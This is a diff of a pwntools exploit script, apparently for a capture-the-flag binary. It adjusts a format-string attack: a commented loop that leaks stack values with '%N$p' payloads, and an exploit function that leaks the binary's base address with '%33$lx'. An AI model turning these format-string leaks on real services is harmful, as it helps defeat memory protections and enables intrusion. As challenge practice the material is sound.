@@ -67,35 +67,35 @@ continue
 # calculating where the stack vars are
 # parts = []
 # for i in range(10, 70, 10):
-#    io = start()
-#
-#    # the return address of main is the 7th stack var
-#    io.recvuntil(b"something: ")
-#
-#    payload = "|".join([f"%{j + i}$p" for j in range(10)])
-#    io.sendline(payload.encode('ascii'))
-#
-#    io.recvuntil(b"said:")
-#    part = io.recvuntil(b"I bet", drop=True).decode('ascii')
-#    io.close()
-#
-#    # formatting
-#    parts.append([i, list(map(lambda x: x.strip(), part.split("|")))])
-#
-## printing out the stack vars
+#     io = start()
+
+#     # the return address of main is the 7th stack var
+#     io.recvuntil(b"commands? ")
+
+#     payload = "|".join([f"%{j + i}$p" for j in range(10)])
+#     io.sendline(payload.encode("ascii"))
+
+#     io.recvuntil(b"execute: ")
+#     part = io.recvuntil(b"Where", drop=True).decode("ascii")
+#     io.close()
+
+#     # formatting
+#     parts.append([i, list(map(lambda x: x.strip(), part.split("|")))])
+
+# # printing out the stack vars
 # for base, part in parts:
-#    for index, p in enumerate(part):
-#        print(f"{(base + index):03d}: {p}")
+#     for index, p in enumerate(part):
+#         print(f"{(base + index):03d}: {p}")
 
 
 def exploit() -> bool:
     io = start()
 
-    # main is @ stack var 43
     io.info("Leaking base address of the binary.")
     io.recvuntil(b"commands? ")
 
-    payload = "%43$lx"
+    # main is @ stack var 33
+    payload = "%33$lx"
     io.sendline(payload.encode("ascii"))
 
     io.recvuntil(b"execute: ")
